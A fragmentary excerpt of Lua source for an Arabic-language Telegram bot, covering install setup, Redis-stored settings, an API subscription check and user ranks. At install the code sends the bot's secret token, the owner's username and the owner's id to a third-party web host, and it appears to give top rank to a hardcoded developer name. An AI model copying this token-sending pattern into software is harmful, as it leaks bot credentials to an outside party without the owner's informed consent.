...
user.Source  = "/root/NK"
local url , res = https.request('https://kiindi-api.ml/lua/nizk/elnizk.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
print(res)
if res ~= 200 then
...
nk = Token:match("(%d+)")
redis:mset(
nk..":VERSION",GetUser.information.Source_version,
nk..":SUDO_ID:",GetUser.information.id,
nk..":DataCenter:",GetUser.information.DataCenter,
nk..":UserNameBot:",BOT_User,
nk..":ApiSource",GetUser.information.WebSite,
nk..":NameBot:","النيزك",
"TH3nk_INSTALL","Yes"
)
redis:hset(nk..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
info = {} 
...
..'¦ Api_Src->: \27[1;34m'..ApiNk..'\027[0;32m\n'
...
if not redis:get(nk..":Check_Bot:"..W) then
Rgz,res=https.request(ApiNk..Tkml..W)
if res == 200 and Rgz == "SendMsg" then redis:setex(nk..":Check_Bot:"..W,1800,true) return false else return Rgz end 
end 
end
...
msg.TheRankCmd = 'محـمـد سـالِـم'
msg.TheRank = 'مُحـمَـد سـالِـم'
msg.Rank = 1
elseif msg.sender_user_id_ == SUDO_ID then 
msg.TheRankCmd = redis:get(nk..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
msg.TheRank = redis:get(nk..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي 👨🏻‍✈️' 
msg.Rank = 1
...
msg.TheRank = redis:get(nk..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت 👨🏼‍⚕️' 
msg.Rank = 4
...
if GetMsg then
print("\27[1;35m¦This_Msg : ",Nk.." | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
